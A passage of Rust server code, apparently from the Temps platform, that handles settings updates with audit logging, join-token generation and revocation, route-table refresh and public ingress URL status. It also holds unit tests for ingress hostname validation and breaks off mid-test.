    match app_state
        .config_service
        .update_settings_with_intents(
            settings,
            geo_license_key_intent,
            trusted_private_networks_intent,
        )
        .await
    {
        Ok(saved) => {
            let previous_trusted_private_networks = saved.previous_trusted_private_networks;
            let next_trusted_private_networks = saved.trusted_private_networks;
            let audit = SettingsUpdatedAudit {
                context: AuditContext {
                    user_id: auth.user_id(),
                    ip_address: Some(metadata.ip_address.clone()),
                    user_agent: metadata.user_agent.clone(),
                },
            };
            if let Err(e) = app_state.audit_service.create_audit_log(&audit).await {
                error!("Failed to create audit log: {}", e);
            }

            // ADR-042 §6.3: a change to either bulk-activation guard gets its
            // own record with both sides, because `SETTINGS_UPDATED` carries no
            // field-level values and a widened spend ceiling must not be
            // indistinguishable from an unrelated save.
            if next_bulk_guards != previous_bulk_guards {
                let widened = next_bulk_guards.anomaly_factor > previous_bulk_guards.anomaly_factor;
                info!(
                    previous_anomaly_factor = previous_bulk_guards.anomaly_factor,
                    new_anomaly_factor = next_bulk_guards.anomaly_factor,
                    previous_rate_limit_spans_per_sec =
                        previous_bulk_guards.rate_limit_spans_per_sec,
                    new_rate_limit_spans_per_sec = next_bulk_guards.rate_limit_spans_per_sec,
                    widened,
                    "Temps Cloud bulk activation guard settings changed"
                );
                let guard_audit = CloudTelemetryBulkGuardUpdatedAudit {
                    context: AuditContext {
                        user_id: auth.user_id(),
                        ip_address: Some(metadata.ip_address.clone()),
                        user_agent: metadata.user_agent.clone(),
                    },
                    previous_anomaly_factor: previous_bulk_guards.anomaly_factor,
                    new_anomaly_factor: next_bulk_guards.anomaly_factor,
                    previous_rate_limit_spans_per_sec: previous_bulk_guards
                        .rate_limit_spans_per_sec,
                    new_rate_limit_spans_per_sec: next_bulk_guards.rate_limit_spans_per_sec,
                    widened_anomaly_factor: widened,
                };
                if let Err(e) = app_state.audit_service.create_audit_log(&guard_audit).await {
                    error!(
                        "Failed to create the Temps Cloud bulk activation guard audit log: {}",
                        e
                    );
                }
            }

            // A credential write gets its own record, with booleans only.
            match geo_license_key_intent {
                temps_core::GeoLicenseKeyIntent::Unchanged => {}
                intent => {
                    let key_set = intent == temps_core::GeoLicenseKeyIntent::Set;
                    info!(
                        key_set,
                        key_cleared = !key_set,
                        "MaxMind license key changed"
                    );
                    let geo_key_audit = GeoLicenseKeyUpdatedAudit {
                        context: AuditContext {
                            user_id: auth.user_id(),
                            ip_address: Some(metadata.ip_address.clone()),
                            user_agent: metadata.user_agent.clone(),
                        },
                        key_set,
                        key_cleared: !key_set,
                    };
                    if let Err(e) = app_state
                        .audit_service
                        .create_audit_log(&geo_key_audit)
                        .await
                    {
                        error!("Failed to create the MaxMind license key audit log: {}", e);
                    }
                }
            }

            if next_clickhouse_compression != previous_clickhouse_compression {
                // Clients carry their codec, so the change is applied by the
                // next restart; say so in the log the operator will read.
                warn!(
                    previous = %previous_clickhouse_compression,
                    new = %next_clickhouse_compression,
                    "ClickHouse compression mode changed; it applies after Temps restarts"
                );
                let compression_audit = ClickHouseCompressionUpdatedAudit {
                    context: AuditContext {
                        user_id: auth.user_id(),
                        ip_address: Some(metadata.ip_address.clone()),
                        user_agent: metadata.user_agent.clone(),
                    },
                    previous_compression: previous_clickhouse_compression,
                    new_compression: next_clickhouse_compression,
                };
                if let Err(e) = app_state
                    .audit_service
                    .create_audit_log(&compression_audit)
                    .await
                {
                    error!(
                        "Failed to create the ClickHouse compression audit log: {}",
                        e
                    );
                }
            }

            if next_trust_loopback_forwarded_ip != previous_trust_loopback_forwarded_ip {
                info!(
                    previous_enabled = previous_trust_loopback_forwarded_ip,
                    new_enabled = next_trust_loopback_forwarded_ip,
                    "Loopback forwarded-IP trust setting changed"
                );
                let forwarded_ip_trust_audit = ForwardedIpTrustUpdatedAudit {
                    context: AuditContext {
                        user_id: auth.user_id(),
                        ip_address: Some(metadata.ip_address.clone()),
                        user_agent: metadata.user_agent.clone(),
                    },
                    previous_enabled: previous_trust_loopback_forwarded_ip,
                    new_enabled: next_trust_loopback_forwarded_ip,
                };
                if let Err(e) = app_state
                    .audit_service
                    .create_audit_log(&forwarded_ip_trust_audit)
                    .await
                {
                    error!(
                        "Failed to create the loopback forwarded-IP trust audit log: {}",
                        e
                    );
                }
            }

            if next_public_ingress_url != previous_public_ingress_url {
                info!(
                    previous_url = previous_public_ingress_url.as_deref().unwrap_or(""),
                    new_url = next_public_ingress_url.as_deref().unwrap_or(""),
                    "Public ingress URL changed"
                );
                let ingress_audit = PublicIngressUrlUpdatedAudit {
                    context: AuditContext {
                        user_id: auth.user_id(),
                        ip_address: Some(metadata.ip_address.clone()),
                        user_agent: metadata.user_agent.clone(),
                    },
                    previous_url: previous_public_ingress_url,
                    new_url: next_public_ingress_url,
                };
                if let Err(e) = app_state
                    .audit_service
                    .create_audit_log(&ingress_audit)
                    .await
                {
                    error!("Failed to create the public ingress URL audit log: {}", e);
                }
                // The ingress hostname is a reserved platform host in the
                // route table. Reload now so the proxy pins it to the
                // public-only surface without waiting for the next reconcile;
                // a failure only delays that, it does not undo the save.
                if let Some(refresher) = app_state.route_table_refresher.as_ref() {
                    if let Err(e) = refresher.refresh_routes().await {
                        warn!(
                            "Failed to refresh the route table after a public ingress URL \
                             change; the proxy picks it up on its next reload: {}",
                            e
                        );
                    }
                }
            }

            if next_trusted_private_networks != previous_trusted_private_networks {
                warn!(
                    previous_networks = ?previous_trusted_private_networks,
                    new_networks = ?next_trusted_private_networks,
                    "Trusted private networks for outbound requests changed"
                );
                let trusted_networks_audit = TrustedPrivateNetworksUpdatedAudit {
                    context: AuditContext {
                        user_id: auth.user_id(),
                        ip_address: Some(metadata.ip_address.clone()),
                        user_agent: metadata.user_agent.clone(),
                    },
                    previous_networks: previous_trusted_private_networks,
                    new_networks: next_trusted_private_networks,
                };
                if let Err(e) = app_state
                    .audit_service
                    .create_audit_log(&trusted_networks_audit)
                    .await
                {
                    error!(
                        "Failed to create the trusted private networks audit log: {}",
                        e
                    );
                }
            }

            Ok((
                StatusCode::OK,
                Json(SettingsUpdateResponse {
                    message: "Settings updated successfully".to_string(),
                }),
            ))
        }
        Err(crate::ConfigServiceError::PublicIngressHostnameInUse { hostname }) => {
            // A status page claimed the hostname after this request checked
            // it. Same response as the up-front check (owner not disclosed
            // beyond the kind of resource).
            Err(ErrorBuilder::new(StatusCode::CONFLICT)
                .title("Public Ingress Hostname In Use")
                .detail(format!(
                    "'{hostname}' is already used by a status page custom domain. The public \
                     ingress hostname is reserved for Temps itself. Choose another hostname, or \
                     remove it from the status page first."
                ))
                .value("field", "public_ingress_url")
                .build())
        }
        Err(e) => {
            tracing::error!("Failed to update settings: {}", e);
            Err(ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .type_("https://temps.sh/probs/settings-error")
                .title("Settings Error")
                .detail(format!("Failed to update settings: {}", e))
                .build())
        }
    }
}

/// SHA-256 hash a token string
fn sha256_hash(token: &str) -> String {
    let digest = sha2::Sha256::digest(token.as_bytes());
    hex::encode(digest)
}

#[derive(Debug, Clone, serde::Serialize)]
struct JoinTokenGeneratedAudit {
    context: AuditContext,
}

impl AuditOperation for JoinTokenGeneratedAudit {
    fn operation_type(&self) -> String {
        "JOIN_TOKEN_GENERATED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

#[derive(Debug, Clone, serde::Serialize)]
struct JoinTokenRevokedAudit {
    context: AuditContext,
}

impl AuditOperation for JoinTokenRevokedAudit {
    fn operation_type(&self) -> String {
        "JOIN_TOKEN_REVOKED".to_string()
    }
    fn user_id(&self) -> Option<i32> {
        Some(self.context.user_id)
    }
    fn ip_address(&self) -> Option<String> {
        self.context.ip_address.clone()
    }
    fn user_agent(&self) -> &str {
        &self.context.user_agent
    }
    fn serialize(&self) -> anyhow::Result<String> {
        serde_json::to_string(self)
            .map_err(|e| anyhow::anyhow!("Failed to serialize audit operation {}", e))
    }
}

/// Generate a new join token for multi-node cluster registration
///
/// Creates a random 32-byte hex token, stores the SHA-256 hash in settings,
/// and returns the plaintext exactly once. If a token already exists, it is replaced.
#[utoipa::path(
    tag = "Settings",
    post,
    path = "/settings/join-token/generate",
    responses(
        (status = 200, description = "Join token generated", body = GenerateJoinTokenResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn generate_join_token(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    Extension(metadata): Extension<RequestMetadata>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);

    // Keep the deprecated shared-token path safe for upgrades from older
    // installations. Cluster trust belongs to the control plane and must
    // exist before any credential capable of enrolling a worker is issued.
    // Startup normally initializes it; this endpoint is a deterministic
    // repair path for a process upgraded without a restart.
    crate::cluster_ca::ensure_cluster_ca(
        &app_state.config_service,
        &app_state.encryption_service,
    )
    .await
    .map_err(|error| {
        error!(%error, "Failed to initialize cluster CA before join-token generation");
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Cluster CA Initialization Failed")
            .detail("The join token was not created because the cluster trust root could not be initialized. Check the server logs for details.")
            .build()
    })?;

    // Generate a random 32-byte token as hex
    let plaintext_token = {
        let mut rng = rand::rng();
        let bytes: Vec<u8> = (0..32).map(|_| rng.random::<u8>()).collect();
        hex::encode(bytes)
    };
    let token_hash = sha256_hash(&plaintext_token);

    // Store the hash in settings
    app_state
        .config_service
        .set_join_token_hash(Some(token_hash))
        .await
        .map_err(|e| {
            error!("Failed to store join token hash: {}", e);
            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Settings Error")
                .detail(format!("Failed to generate join token: {}", e))
                .build()
        })?;

    info!(user_id = auth.user_id(), "Join token generated");

    let audit = JoinTokenGeneratedAudit {
        context: AuditContext {
            user_id: auth.user_id(),
            ip_address: Some(metadata.ip_address.clone()),
            user_agent: metadata.user_agent.clone(),
        },
    };
    if let Err(e) = app_state.audit_service.create_audit_log(&audit).await {
        error!("Failed to create audit log: {}", e);
    }

    Ok(Json(GenerateJoinTokenResponse {
        token: plaintext_token,
        message: "Join token generated. Save this token — it will not be shown again.".to_string(),
    }))
}

/// Revoke the current join token
///
/// Removes the stored join token hash, allowing any node to register
/// (if no other authentication is in place).
#[utoipa::path(
    tag = "Settings",
    delete,
    path = "/settings/join-token",
    responses(
        (status = 200, description = "Join token revoked", body = SettingsUpdateResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn revoke_join_token(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    Extension(metadata): Extension<RequestMetadata>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);

    app_state
        .config_service
        .set_join_token_hash(None)
        .await
        .map_err(|e| {
            error!("Failed to revoke join token: {}", e);
            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Settings Error")
                .detail(format!("Failed to revoke join token: {}", e))
                .build()
        })?;

    info!(user_id = auth.user_id(), "Join token revoked");

    let audit = JoinTokenRevokedAudit {
        context: AuditContext {
            user_id: auth.user_id(),
            ip_address: Some(metadata.ip_address.clone()),
            user_agent: metadata.user_agent.clone(),
        },
    };
    if let Err(e) = app_state.audit_service.create_audit_log(&audit).await {
        error!("Failed to create audit log: {}", e);
    }

    Ok(Json(SettingsUpdateResponse {
        message: "Join token revoked successfully".to_string(),
    }))
}

/// Check whether a join token is currently configured
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings/join-token/status",
    responses(
        (status = 200, description = "Join token status", body = JoinTokenStatusResponse),
        (status = 401, description = "Unauthorized"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn get_join_token_status(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsRead);

    let settings = app_state.config_service.get_settings().await.map_err(|e| {
        error!("Failed to read settings for join token status: {}", e);
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Settings Error")
            .detail(format!("Failed to check join token status: {}", e))
            .build()
    })?;

    Ok(Json(JoinTokenStatusResponse {
        has_token: settings.multi_node.join_token_hash.is_some(),
    }))
}

#[derive(Debug, Serialize, ToSchema)]
struct RouteRefreshResponse {
    /// Number of routes loaded
    route_count: usize,
    /// Human-readable message
    message: String,
}

/// Manually refresh the proxy route table
///
/// Reloads all routes from the database into the in-memory proxy cache.
/// Useful as a workaround when routes are out of sync.
#[utoipa::path(
    tag = "Settings",
    post,
    path = "/settings/routes/refresh",
    responses(
        (status = 200, description = "Route table refreshed", body = RouteRefreshResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn refresh_route_table(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);

    let refresher = app_state.route_table_refresher.as_ref().ok_or_else(|| {
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Route Table Unavailable")
            .detail("Route table refresher is not configured")
            .build()
    })?;

    let route_count = refresher.refresh_routes().await.map_err(|e| {
        error!("Failed to refresh route table: {}", e);
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Route Refresh Failed")
            .detail(format!("Failed to refresh route table: {}", e))
            .build()
    })?;

    info!(
        "Route table manually refreshed by user {} ({} routes loaded)",
        auth.user_id(),
        route_count
    );

    Ok(Json(RouteRefreshResponse {
        route_count,
        message: format!(
            "Route table refreshed successfully ({} routes loaded)",
            route_count
        ),
    }))
}

/// Where third-party callbacks are sent, and whether they can arrive.
///
/// The console reads callback URLs from here instead of deriving them from
/// the address the operator happens to be browsing, which is the console host
/// and may be private.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
pub struct PublicIngressStatusResponse {
    /// Base URL third parties are given, with no trailing slash. Callback
    /// paths (`/api/webhook/git/...`, `/api/emails/...`) are appended to it.
    #[schema(example = "https://hooks.example.com")]
    pub effective_url: String,
    /// Whether `effective_url` is the explicit setting or the `external_url`
    /// fallback.
    pub source: temps_core::public_ingress::PublicIngressSource,
    /// `false` when Temps can tell from its own configuration that a third
    /// party cannot reach `effective_url`. `true` is not a guarantee: a
    /// firewall, VPN or identity-aware proxy in front of the host is
    /// invisible from here.
    pub configured: bool,
    /// Why callbacks will not arrive, when `configured` is false.
    pub reason: Option<String>,
    /// Console path that fixes it, when `configured` is false.
    #[schema(example = "/settings#public-ingress")]
    pub setup_path: Option<String>,
}

impl From<&AppSettings> for PublicIngressStatusResponse {
    fn from(settings: &AppSettings) -> Self {
        let resolved = settings.resolve_public_ingress();
        let reason = resolved.unreachable_reason.map(|why| {
            format!(
                "Callback URLs point at {}, which third parties cannot reach: {}. Email opens \
                 and clicks, provider webhooks and delivery events will not arrive until a \
                 publicly reachable URL is configured.",
                resolved.effective_url, why
            )
        });
        Self {
            effective_url: resolved.effective_url,
            source: resolved.source,
            configured: reason.is_none(),
            setup_path: reason
                .is_some()
                .then(|| temps_core::public_ingress::PUBLIC_INGRESS_SETUP_PATH.to_string()),
            reason,
        }
    }
}

/// Get where third-party callbacks are sent
///
/// Returns the base URL Temps hands to third parties that call back into it
/// (email open/click tracking, git provider webhooks, SES/SNS delivery
/// events, revenue webhooks, the Sentry DSN) and whether Temps can tell that
/// URL is unreachable for them. Unlike a 404, `configured: false` means the
/// feature exists but needs setting up; `setup_path` says where.
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings/public-ingress",
    responses(
        (status = 200, description = "Effective public ingress URL and its reachability", body = PublicIngressStatusResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn get_public_ingress_status(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    // Deliberately not `SettingsRead`: this is read by everyone who wires a
    // callback (a project member pasting a revenue webhook URL into a
    // provider), not only by whoever may read the settings document. The
    // response holds nothing confidential — the URL is printed in every
    // tracked email Temps sends.
    permission_guard!(auth, ProjectsRead);

    let settings = app_state.config_service.get_settings().await.map_err(|e| {
        error!(
            "Failed to load settings for the public ingress status: {}",
            e
        );
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .type_("https://temps.sh/probs/settings-error")
            .title("Settings Error")
            .detail(format!(
                "Failed to load settings for the public ingress status: {}",
                e
            ))
            .build()
    })?;

    Ok(Json(PublicIngressStatusResponse::from(&settings)))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn public_ingress_status_reports_the_explicit_url_as_configured() {
        let settings = AppSettings {
            external_url: Some("https://console.example.com".into()),
            public_ingress_url: Some("https://hooks.example.com".into()),
            ..Default::default()
        };
        assert_eq!(
            PublicIngressStatusResponse::from(&settings),
            PublicIngressStatusResponse {
                effective_url: "https://hooks.example.com".into(),
                source: temps_core::public_ingress::PublicIngressSource::Explicit,
                configured: true,
                reason: None,
                setup_path: None,
            }
        );
    }

    #[test]
    fn public_ingress_status_falls_back_to_the_external_url() {
        let settings = AppSettings {
            external_url: Some("https://console.example.com/".into()),
            ..Default::default()
        };
        let status = PublicIngressStatusResponse::from(&settings);
        assert_eq!(status.effective_url, "https://console.example.com");
        assert_eq!(
            status.source,
            temps_core::public_ingress::PublicIngressSource::ExternalUrlFallback
        );
        assert!(status.configured);
    }

    #[test]
    fn public_ingress_status_onboards_when_the_host_is_unreachable() {
        let status = PublicIngressStatusResponse::from(&AppSettings::default());
        assert!(!status.configured);
        assert_eq!(status.effective_url, "http://localho.st");
        assert_eq!(
            status.setup_path.as_deref(),
            Some("/settings#public-ingress")
        );
        let reason = status.reason.expect("an unreachable host states why");
        assert!(reason.contains("http://localho.st"), "{reason}");
        assert!(reason.contains("loopback"), "{reason}");
    }

    fn ingress_config_service(db: sea_orm::MockDatabase) -> ConfigService {
        ConfigService::new(
            Arc::new(
                crate::ServerConfig::new(
                    "127.0.0.1:3000".to_string(),
                    "postgresql://test".to_string(),
                    None,
                    Some("127.0.0.1:8000".to_string()),
                )
                .expect("ServerConfig::new"),
            ),
            Arc::new(db.into_connection()),
        )
    }

    /// A route table that reports one fixed answer and records what it was
    /// asked, so a test can also prove it was not consulted at all.
    #[derive(Default)]
    struct StubRouteTable {
        serving: Option<&'static str>,
        fails: bool,
        asked: std::sync::Mutex<Vec<String>>,
    }

    #[temps_core::async_trait::async_trait]
    impl temps_core::route_table::RouteTableRefresher for StubRouteTable {
        async fn refresh_routes(&self) -> Result<usize, Box<dyn std::error::Error + Send + Sync>> {
            Ok(0)
        }

        async fn application_serving_host(
            &self,
            host: &str,
        ) -> Result<Option<String>, Box<dyn std::error::Error + Send + Sync>> {
            self.asked.lock().unwrap().push(host.to_string());
            if self.fails {
                return Err("route table reload failed".into());
            }
            Ok(self.serving.map(str::to_string))
        }
    }

    fn free_route_table() -> StubRouteTable {
        StubRouteTable::default()
    }

    fn free_hostname_db() -> sea_orm::MockDatabase {
        use temps_entities::{custom_routes, environment_domains, project_custom_domains};
        sea_orm::MockDatabase::new(sea_orm::DatabaseBackend::Postgres)
            .append_query_results(vec![Vec::<project_custom_domains::Model>::new()])
            .append_query_results(vec![Vec::<environment_domains::Model>::new()])
            .append_query_results(vec![Vec::<custom_routes::Model>::new()])
            // A hostname attached to a status page (#1412).
            .append_query_results(vec![
                Vec::<temps_entities::status_page_domains::Model>::new(),
            ])
    }

    #[tokio::test]
    async fn public_ingress_url_is_normalized_when_the_hostname_is_free() {
        let svc = ingress_config_service(free_hostname_db());
        let saved = validate_public_ingress_url(
            &svc,
            Some(&free_route_table()),
            Some("  https://Hooks.Example.com/ ".into()),
            None,
            "apps.example.com",
        )
        .await
        .expect("a free, public hostname is accepted");
        assert_eq!(saved.as_deref(), Some("https://hooks.example.com"));
    }

    #[tokio::test]
    async fn blank_public_ingress_url_clears_the_setting_without_a_lookup() {
        // Nothing queued: a database read would fail the test.
        let svc = ingress_config_service(sea_orm::MockDatabase::new(
            sea_orm::DatabaseBackend::Postgres,
        ));
        for submitted in [None, Some(String::new()), Some("   ".to_string())] {
            let saved = validate_public_ingress_url(
                &svc,
                Some(&free_route_table()),
                submitted,
                Some("https://hooks.example.com"),
                "apps.example.com",
            )
            .await
            .expect("blank clears the setting");
            assert_eq!(saved, None);
        }
    }

    #[tokio::test]
    async fn unchanged_public_ingress_url_is_not_revalidated() {
        // A value that would be refused today must not fail an unrelated save.
        let svc = ingress_config_service(sea_orm::MockDatabase::new(
            sea_orm::DatabaseBackend::Postgres,
        ));
        let saved = validate_public_ingress_url(
            &svc,
            Some(&free_route_table()),
            Some("http://10.0.0.5".into()),
            Some("http://10.0.0.5"),
            "apps.example.com",
        )
        .await
        .expect("the stored value passes through");
        assert_eq!(saved.as_deref(), Some("http://10.0.0.5"));
    }

    #[tokio::test]
    async fn public_ingress_url_with_a_path_or_private_host_is_a_bad_request() {
        let svc = ingress_config_service(sea_orm::MockDatabase::new(
            sea_orm::DatabaseBackend::Postgres,
        ));
        for url in [
            "https://hooks.example.com/api",
            "https://hooks.example.com?x=1",
            "http://127.0.0.1:8080",
            "http://hooks.localho.st",
            "https://apps.example.com",
        ] {
            let problem = validate_public_ingress_url(
                &svc,
                Some(&free_route_table()),
                Some(url.into()),
                None,
                "apps.example.com",
            )
            .await
            .expect_err("an invalid ingress URL must be rejected");
            assert_eq!(problem.status_code, StatusCode::BAD_REQUEST, "{url}");
            assert_eq!(
                problem.body.get("field").and_then(|v| v.as_str()),
                Some("public_ingress_url"),
                "{url}"
            );
        }
    }

    #[tokio::test]
    async fn public_ingress_url_on_a_project_hostname_is_a_conflict() {
        use temps_entities::{environment_domains, project_custom_domains};
        let db = sea_orm::MockDatabase::new(sea_orm::DatabaseBackend::Postgres)
            .append_query_results(vec![Vec::<project_custom_domains::Model>::new()])
            .append_query_results(vec![vec![environment_domains::Model {
                id: 1,
                environment_id: 2,
                domain: "shop.example.com".into(),
                created_at: chrono::Utc::now(),
                audience: "public".to_string(),
                private_range: None,
                private_node_id: None,
                private_listener: None,
                private_via: None,
                private_service: None,
            }]]);
        let svc = ingress_config_service(db);
        let problem = validate_public_ingress_url(
            &svc,
            Some(&free_route_table()),
            Some("https://shop.example.com".into()),
            None,
            "apps.example.com",
        )
        .await
        .expect_err("a hostname an environment routes must be refused");
        assert_eq!(problem.status_code, StatusCode::CONFLICT);
        let detail = problem.body.get("detail").and_then(|v| v.as_str()).unwrap();
        assert!(detail.contains("shop.example.com"), "{detail}");
        assert!(detail.contains("an environment domain"), "{detail}");
    }

    #[tokio::test]
    async fn public_ingress_url_is_not_saved_when_the_hostname_check_fails() {
        let db = sea_orm::MockDatabase::new(sea_orm::DatabaseBackend::Postgres)
            .append_query_errors(vec![sea_orm::DbErr::Custom("connection reset".into())]);
        let svc = ingress_config_service(db);
        let problem = validate_public_ingress_url(
            &svc,
            Some(&free_route_table()),
            Some("https://hooks.example.com".into()),
            None,
            "apps.example.com",
        )
        .await
        .expect_err("an unverifiable hostname must not be saved");
        assert_eq!(problem.status_code, StatusCode::INTERNAL_SERVER_ERROR);
    }

    // The stored domain rows say nothing about a name a wildcard route covers
    // or one generated from an environment's subdomain. The route table does,
    // and reserving such a name would stop serving the application behind it.
    #[tokio::test]
    async fn public_ingress_url_on_a_host_the_route_table_serves_is_a_conflict() {
        for owner in [
            "a deployed application",
            "an environment's generated hostname",
            "a sleeping on-demand environment",
        ] {
            let svc = ingress_config_service(free_hostname_db());
            let route_table = StubRouteTable {
                serving: Some(owner),
                ..Default::default()
            };
            let problem = validate_public_ingress_url(
                &svc,
                Some(&route_table),
                Some("https://App.Example.com".into()),
                None,
                "apps.example.com",
            )
            .await
            .expect_err("a hostname the proxy serves must be refused");
            assert_eq!(problem.status_code, StatusCode::CONFLICT, "{owner}");
            let detail = problem.body.get("detail").and_then(|v| v.as_str()).unwrap();
            assert!(detail.contains("app.example.com"), "{detail}");
            assert!(detail.contains(owner), "{detail}");
            assert_eq!(
                route_table.asked.lock().unwrap().as_slice(),
                ["app.example.com"],
                "the route table is asked about the normalized hostname"
            );
        }
    }

    #[tokio::test]
    async fn public_ingress_url_is_not_saved_when_the_route_table_cannot_answer() {
        // A failed reload, or no route table at all: either way nothing rules
        // out an application on that name, so the change is refused.
        let svc = ingress_config_service(free_hostname_db());
        let failing = StubRouteTable {
            fails: true,
            ..Default::default()
        };
        let problem = validate_public_ingress_url(
            &svc,
            Some(&failing),
            Some("https://hooks.example.com".into()),
            None,
            "apps.example.com",
        )
        .await
        .expect_err("an unverifiable hostname must not be saved");
        assert_eq!(problem.status_code, StatusCode::INTERNAL_SERVER_ERROR);

        let svc = ingress_config_service(free_hostname_db());
        let problem = validate_public_ingress_url(
            &svc,
            None,
            Some("https://hooks.example.com".into()),
            None,
            "apps.example.com",
        )
        .await
        .expect_err("without a route table the hostname cannot be verified");
        assert_eq!(problem.status_code, StatusCode::INTERNAL_SERVER_ERROR);
        let detail = problem.body.get("detail").and_then(|v| v.as_str()).unwrap();
        assert!(detail.contains("route table"), "{detail}");
    }

    // The generated namespace is refused outright, before any lookup: a name
    // directly under the preview domain can belong to an environment that
    // exists now or one created later, and a `ws-` shaped one is a sandbox
    // preview to the proxy.
    #[tokio::test]
    async fn public_ingress_url_inside_the_preview_namespace_is_refused_without_a_lookup() {
        // Nothing queued and a route table that records being asked.
        let svc = ingress_config_service(sea_orm::MockDatabase::new(
            sea_orm::DatabaseBackend::Postgres,
        ));
        let route_table = free_route_table();
        for url in [
            "https://hooks.apps.example.com",
            "https://shop-production.apps.example.com",
            "https://ws-0123456789abcdef-3000.apps.example.com",
        ] {
            let problem = validate_public_ingress_url(
                &svc,
                Some(&route_table),
                Some(url.into()),
                None,
                "*.apps.example.com",
            )
            .await
            .expect_err("a name inside the generated namespace must be refused");
            assert_eq!(problem.status_code, StatusCode::BAD_REQUEST, "{url}");
            let detail = problem.body.get("detail").and_then(|v| v.as_str()).unwrap();
            assert!(detail.contains("inside the preview domain"), "{detail}");
        }
        assert!(route_table.asked.lock().unwrap().is_empty());
    }

    // The collision can also be created from the other side, by moving the
    // preview domain onto an ingress hostname that was fine when it was saved.
    #[tokio::test]
    async fn a_preview_domain_moved_onto_the_stored_ingress_hostname_is_refused() {
        let svc = ingress_config_service(sea_orm::MockDatabase::new(
            sea_orm::DatabaseBackend::Postgres,
        ));
        let stored = "https://hooks.example.com";

        let problem = validate_public_ingress_url(
            &svc,
            Some(&free_route_table()),
            Some(stored.into()),
            Some(stored),
            "example.com",
        )
        .await
        .expect_err("the unchanged ingress host is now inside the preview namespace");
        assert_eq!(problem.status_code, StatusCode::BAD_REQUEST);
        assert_eq!(
            problem.body.get("field").and_then(|v| v.as_str()),
            Some("preview_domain")
        );

        // An unrelated save, with the preview domain where it was, still passes.
        let saved = validate_public_ingress_url(
            &svc,
            Some(&free_route_table()),
            Some(stored.into()),
            Some(stored),
            "apps.example.com",
        )
        .await
        .expect("an unchanged pair is not re-validated");
        assert_eq!(saved.as_deref(), Some(stored));
    }

    #[tokio::test]
    async fn clearing_or_keeping_the_public_ingress_url_never_reloads_routes() {
        let svc = ingress_config_service(sea_orm::MockDatabase::new(
            sea_orm::DatabaseBackend::Postgres,
        ));
        let route_table = free_route_table();
        for (submitted, stored) in [
            (None, Some("https://hooks.example.com")),
            (
                Some("https://hooks.example.com".to_string()),
                Some("https://hooks.example.com"),
            ),
        ] {
            validate_public_ingress_url(
                &svc,
                Some(&route_table),
                submitted,
                stored,
                "apps.example.com",
            )
            .await
            .expect("an unchanged or cleared value needs no check");
        }
        assert!(route_table.asked.lock().unwrap().is_empty());
    }

    #[test]
    fn public_ingress_url_change_has_its_own_audit_event() {
        let audit = PublicIngressUrlUpdatedAudit {
            context: AuditContext {
                user_id: 4,
                ip_address: Some("198.51.100.7".into()),
                user_agent: "test".into(),
            },
            previous_url: None,
            new_url: Some("https://hooks.example.com".into()),
        };
        assert_eq!(audit.operation_type(), "PUBLIC_INGRESS_URL_UPDATED");
        let serialized: serde_json::Value =
            serde_json::from_str(&AuditOperation::serialize(&audit).unwrap()).unwrap();
        assert_eq!(serialized["previous_url"], serde_json::Value::Null);
        assert_eq!(serialized["new_url"], "https://hooks.example.com");
    }

    #[test]
    fn settings_get_response_reports_the_public_ingress_url() {
        let settings = AppSettings {
            public_ingress_url: Some("https://hooks.example.com".into()),
            ..Default::default()
        };
        let response = serde_json::to_value(AppSettingsResponse::from(settings)).unwrap();
        assert_eq!(response["public_ingress_url"], "https://hooks.example.com");
    }

    #[test]
    fn sandbox_limit_settings_reject_values_that_would_break_every_create() {
        let ok = AgentSandboxSettings::default();
        assert!(validate_sandbox_limits(&ok).is_ok());
        let ok = AgentSandboxSettings {
            max_cpu_limit: Some(2.0),
            max_memory_limit_mb: Some(4096),
            max_pids_limit: Some(256),
            max_sandboxes_per_user: Some(5),
            ..Default::default()
        };
        assert!(validate_sandbox_limits(&ok).is_ok());

        let bad = [
            (
                "max_cpu_limit",
